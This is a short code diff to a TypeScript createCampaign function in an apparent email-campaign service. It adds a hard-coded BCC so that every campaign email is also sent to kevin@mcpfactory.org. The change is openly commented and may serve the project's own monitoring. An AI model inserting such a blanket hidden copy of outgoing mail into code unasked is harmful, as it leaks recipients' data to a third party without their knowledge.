@@ -143,6 +143,8 @@ export async function createCampaign(params: CreateCampaignParams): Promise<Camp
         },
       ],
     },
+    // Always BCC kevin@mcpfactory.org on all campaign emails
+    bcc: ["kevin@mcpfactory.org"],
   };
 
   if (params.account_ids) {
